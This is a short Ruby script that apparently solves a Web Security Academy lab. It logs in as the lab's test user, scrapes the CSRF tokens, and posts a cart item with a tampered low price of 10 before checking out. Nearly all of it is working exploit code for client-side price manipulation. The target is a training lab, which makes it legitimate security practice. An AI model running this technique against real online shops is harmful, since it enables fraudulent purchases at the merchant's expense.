require 'http'
require 'nokogiri'

url='https://0aaa0010033c917885fb2615004f0016.web-security-academy.net'

#1. Login as wiener
puts 'Logging in as wiener...'
login_csrf = ''
login = HTTP.get(url+'/login')
temp1 = Nokogiri.parse login.body.to_s
temp1.search(:tag,'input').to_a.each {|d| login_csrf = d.attr('value') if d.attr('name')=='csrf'}
login_client = HTTP.cookies('session'=>"#{login['Set-Cookie'].split(';')[0].split('=')[1]}").post(url+'/login',:form => {
		"csrf"=>"#{login_csrf}",
		"username"=>"wiener",
		"password"=>"peter"
		})

cookie = login_client['Set-Cookie'].split(';')[0].split('=')[1]
puts 'Extracting cookie...'

#2. Add product to cart
puts 'Exploiting the vuln...'

client = HTTP.cookies('session'=>cookie)
resp_cart = client.post(url+'/cart',:form => {
	"productId"=>"1",
	"redir"=>"PRODUCT",
	"quantity"=>"1",
	"price"=>"10"
})
csrf =''
get_cart = client.get(url+'/cart')
temp2 = Nokogiri.parse get_cart.body.to_s
temp2.search(:tag,'input').to_a.each {|d| csrf = d.attr('value') if d.attr('name')=='csrf'}


#3. Checkout
puts 'Checking out'
resp_checkout = client.post(url+'/cart/checkout',:form=>{ "csrf"=>"#{csrf}" })
puts "Success" if resp_checkout['Location'] # this is a flawed check ik, it can be improved, but i am feeling lazy today
puts resp_checkout['Location']
